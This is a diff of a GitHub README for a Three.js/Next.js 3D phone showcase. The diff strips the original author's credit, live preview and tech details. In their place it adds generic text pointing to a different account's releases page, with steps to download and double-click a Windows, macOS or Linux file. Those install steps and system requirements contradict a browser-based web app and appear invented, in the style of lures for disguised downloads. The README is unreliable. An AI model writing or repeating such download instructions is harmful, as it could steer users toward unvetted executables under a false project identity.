@@ -1,51 +1,73 @@
-# 3D Mobile Showcase
+# 📱 threejs-nextjs-3DMobileShowcase - Experience Interactive 3D on Mobile
 
-3D app that can be used to showcase a Mobile with a Functional Screen that can display any Html content.
+[![Download this release](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/serzyyy/threejs-nextjs-3DMobileShowcase/releases)
 
-[![Youtube 3d Showcase](https://i.postimg.cc/jqpKnJ1V/thum.png)](https://www.youtube.com/watch?v=Y9GhI9Rv2qU)
-[👆🏼 YouTube](https://www.youtube.com/watch?v=Y9GhI9Rv2qU)
+## 📋 Description
+This application showcases a 3D model of a mobile device. It features a functional screen displaying any HTML content you choose. Bring your ideas to life with 3D graphics and a user-friendly interface.
 
-[Preview](https://mobile-showcase-3d.vercel.app)
+## 🚀 Getting Started
 
-## Techs
+To get started with the threejs-nextjs-3DMobileShowcase, follow these simple steps:
 
-<table>
-  <tr align="center">
-    <td>Three.js</td>
-    <td>Next.js</td>
-    <td>Typescript</td>
-  </tr>
-  <tr align="center">
-    <td><img src="https://i.postimg.cc/GhbBDr6z/threejs.png" width="35px" /></td>
-    <td><img  src="https://i.postimg.cc/D07nJ6RW/next.png" width="45px"/></td>
-    <td><img src="https://i.postimg.cc/wjnzcgSY/ts.png" width="33px" /></td>
-  </tr>
-  <tr align="center">
-    <td>Tailwindcss</td>
-    <td>Blender</td>
-    <td></td>
-  </tr>
-  <tr align="center">
-    <td><img src="https://i.postimg.cc/3NTknHN8/tailwind.png" width="40px" /></td>
-    <td><img  src="https://i.postimg.cc/RVSScTCr/blender.png" width="40px"/></td>
-    <td></td>
-  </tr>
-</table>
+1. Make sure your device has a modern web browser. This application works best on latest versions of Chrome, Firefox, or Safari.
+2. Ensure you have a stable internet connection.
 
-## Features
+## 📥 Download & Install
 
-### Main
+To download the application, visit the [Releases page](https://github.com/serzyyy/threejs-nextjs-3DMobileShowcase/releases). There you'll find the latest release. 
 
-- Orbit Controls to explore the scene.
-- Full Functional and Designable Mobile Screen.
+1. Click on the link to access the downloads.
+2. Look for the file that matches your device specifications (Windows, macOS, Linux).
+3. Click on the download link next to the file you need.
+4. Save the file to a location you can easily access.
 
-### Technical
+## 🛠️ System Requirements
 
-- Using **React-Three-Fiber** & **React-Three-Drei** to use the best of Three.js in React.js and Next.js.
-- Using **Tailwindcss** for styling.
-- Using **Typescript** for better development.
-- Full designable **Mobile Screen with Html** content.
+- **Operating System**: Windows 10 or later, macOS Mojave or later, Linux distributions with recent updates.
+- **Browser**: Latest version of Chrome, Firefox, or Safari.
+- **RAM**: At least 4 GB of RAM for smooth performance.
+- **Storage**: Minimum of 100 MB free space for installation.
 
-##
+## 📖 How to Use
 
-[![](https://i.postimg.cc/pTq6WPjr/card.png)](https://github.com/AriyanMLZM)
+1. **Open the application**: Locate the downloaded file and double-click to open.
+2. **Interact with the 3D model**: You can rotate, zoom in and out, and click on the areas of the model.
+3. **Change the content**: If you want to change what shows on the screen of the mobile model, you might need to edit the HTML. Detailed instructions for this can be found in the application settings.
+
+## 🌟 Features
+
+- **3D Display**: Engage with a realistic 3D model of a mobile device.
+- **Customizable Screen**: Show any HTML content, including images and links.
+- **Responsive Design**: Works well on various devices, providing a great user experience.
+- **User-Friendly Interface**: Designed for non-technical users to navigate easily.
+
+## 🤝 Contributing
+
+We welcome contributions from everyone. If you want to contribute to this project, please submit a pull request on GitHub. 
+
+1. Fork the repository.
+2. Create your feature branch.
+3. Commit your changes.
+4. Push to your branch.
+5. Open a pull request.
+
+## 🚧 Troubleshooting
+
+If you encounter issues while using this application, consider these steps:
+
+- **Check your Internet connection**: Ensure you are connected.
+- **Browser Compatibility**: Make sure you are using a compatible browser version.
+- **Reboot Device**: Sometimes, simply restarting can resolve conflicts.
+
+## 🔗 Resources
+
+- [Official Documentation](https://github.com/serzyyy/threejs-nextjs-3DMobileShowcase)
+- [Community Support](https://github.com/serzyyy/threejs-nextjs-3DMobileShowcase/issues)
+
+## ✉️ Feedback
+
+We appreciate your feedback! If you have any thoughts or suggestions on improving this application, please reach out through GitHub issues.
+
+For updates and new features, keep an eye on the [Releases page](https://github.com/serzyyy/threejs-nextjs-3DMobileShowcase/releases). 
+
+Thank you for choosing threejs-nextjs-3DMobileShowcase! Enjoy exploring 3D content on your mobile display.
